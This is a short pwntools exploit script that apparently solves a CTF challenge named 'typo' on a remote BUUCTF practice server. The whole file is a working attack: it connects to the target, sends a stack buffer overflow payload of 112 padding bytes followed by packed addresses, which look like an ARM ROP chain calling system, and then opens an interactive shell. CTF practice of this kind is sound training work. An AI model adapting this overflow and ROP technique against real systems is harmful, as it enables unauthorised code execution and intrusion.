from pwn import *
context.log_level = "debug"

#p = process("./typo")
p = remote("node3.buuoj.cn", 26014)
    
p.sendafter("quit\n", "\n")
p.recvline()

payload = 'a' * 112 + p32(0x20904) + p32(0x6c384) + p32(1) + p32(0x110B4)
p.sendlineafter("\n", payload)
p.interactive()
